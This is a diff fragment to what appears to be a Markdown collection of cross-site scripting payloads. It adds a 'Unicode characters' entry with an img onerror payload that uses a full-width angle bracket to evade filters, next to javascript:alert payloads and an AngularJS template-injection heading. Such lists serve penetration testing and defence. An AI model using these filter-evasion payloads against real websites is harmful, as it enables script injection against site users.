@@ -116,6 +116,12 @@ XSS[JavaScript:alert(1)]
 __ javascript:alert(document.domain)  
 ```
 
+**Unicode characters**
+
+```html
+†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
+```
+
 **AngularJS Template Injection based XSS**
 
 *For manual verification on a live target, use `angular.version` in your browser console*
